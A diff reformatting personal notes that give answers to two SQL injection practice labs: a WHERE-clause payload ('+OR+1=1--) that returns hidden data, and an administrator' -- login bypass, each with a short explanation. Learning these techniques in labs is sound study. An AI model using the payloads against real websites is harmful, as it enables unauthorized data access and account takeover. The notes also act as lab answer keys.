@@ -1,10 +1,20 @@
-1st Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data
+# SQL Injection Labs
 
-Answer: GET /filter?category='+OR+1=1-- HTTP/2
-why we used OR 1=1 is becase F OR T == T
+## 1st Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data
 
-2nd Lab: SQL injection vulnerability allowing login bypass
+**Answer:**
+GET /filter?category='+OR+1=1-- HTTP/2
 
-input: administrator' --   
-password: any password
-The usage of '--' is to ignore the rest of the Query
+**Why we used OR 1=1:**
+Because `F OR T = T`, so the condition always becomes true and returns all data.
+
+---
+
+## 2nd Lab: SQL injection vulnerability allowing login bypass
+
+**Input:**
+username: `administrator' --`  
+password: `any password`
+
+**Explanation:**
+The usage of `--` is to ignore the rest of the SQL query, so the password check is skipped completely.
